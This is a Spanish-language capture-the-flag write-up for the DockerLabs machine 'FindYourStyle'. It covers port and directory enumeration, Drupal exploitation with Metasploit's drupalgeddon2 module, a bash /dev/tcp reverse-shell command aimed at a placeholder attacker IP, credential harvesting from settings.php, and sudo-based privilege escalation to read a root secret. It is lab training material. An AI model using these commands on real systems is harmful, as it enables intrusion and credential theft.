---
title: FINDYOURSTYLE
excerpt: WritheUp maquina de DockerLabs
publishDate: 'Nov 05 2024'
isFeatured: true
tags:
  - Web
  - Guide
  - CTF
  - Dockerlabs
seo:
  image:
    src: ''
    alt: Wavy lines
---



<img src="/20241102202156.png" alt="Texto alternativo" />

---

Enumeración:

```
nmap -sSCV -p- --open --min-rate 5000 172.17.0.2 -Pn -n -vvv
```
Puertos:

80 HTTP

<img src="/20241102202802.png" alt="Texto alternativo" />

---

Web:

Comando:

```
gobuster dir -u http://172.17.0.2 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x txt,php,html,js
```
<img src="/20241104222818.png" alt="Texto alternativo" />



Como vemos son varias las páginas.

Revisamos las tecnologías ocupadas:


<img src="/20241102205148.png" alt="Texto alternativo" />

<img src="/20241102203435.png" alt="Texto alternativo" />

---

Ataque
Usando Metasploit:


<img src="/20241104223222.png" alt="Texto alternativo" />

Usaremos el modulo unix/webapp/drupal_drupalgeddon2:

<img src="/20241104223447.png" alt="Texto alternativo" />


<img src="/20241104223821.png" alt="Texto alternativo" />


comando en meterpreter para una reverse shell: execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/TU_IP/4445 0>&1'"


<img src="/20241104224011.png" alt="Texto alternativo" />

<img src="/20241104224107.png" alt="Texto alternativo" />


Despues de buscar por distintos archivos encontramos uno interesante, settings.php en la ruta /var/www/html/sites/default

Con la herramienta grep buscamos mas facil.


<img src="/20241104224618.png" alt="Texto alternativo" />


Credenciales

User: ballenita

Password: ballenitafeliz

---

Escalada:

Revisamos lo que podemos ejecutar con sudo -l:

<img src="/20241104225028.png" alt="Texto alternativo" />


Podemos ejecutar los binarios ls y grep, gracias a esto leeremos los archivos que estén en el directorio /root.

Ejecutamos el comando:

```
sudo /bin/ls -la /root/
```


Esto hace lo siguiente:

<p style="color: red;">sudo:</p> Ejecuta el comando con privilegios de superusuario (administrador). Esto es necesario ya que el acceso al directorio /root suele estar restringido para usuarios normales.

<p style="color: red;">/bin/ls:</p> Ejecuta el comando ls, que se encuentra en el directorio /bin. Específicamente, se utiliza la ruta completa /bin/ls para asegurarse de que se esté ejecutando el binario ls exacto desde ese directorio, evitando alias o scripts con el mismo nombre en el sistema.

<p style="color: red;">-la:</p> Son opciones para el comando ls:

<p style="color: red;">-l:</p> Muestra los detalles de cada archivo en formato largo, incluyendo permisos, número de enlaces, propietario, grupo, tamaño, fecha y nombre del archivo.

<p style="color: red;">-a:</p> Muestra todos los archivos, incluyendo los ocultos (los que comienzan con un punto).

<p style="color: red;">/root/:</p> Especifica el directorio /root, que es el directorio personal del usuario root en sistemas Linux.

Encontramos el archivo secretitomaximo.txt, con grep leeremos el contenido con el siguiente comando:

```
sudo grep '' /root/secretitomaximo.txt
```

Explicacion:

El comando intentará leer todo el contenido del archivo /root/secretitomaximo.txt usando grep, y al poner '' (comillas vacías) está indicando que coincida con todas las líneas. Esto es una técnica para ver todo el contenido del archivo sin filtrar ninguna línea en particular.

Credenciales Encontradas:<br>

User: root

Password: nobodycanfindthispasswordrootrocks



<img src="/20241104225439.png" alt="Texto alternativo" />

Éxito!

---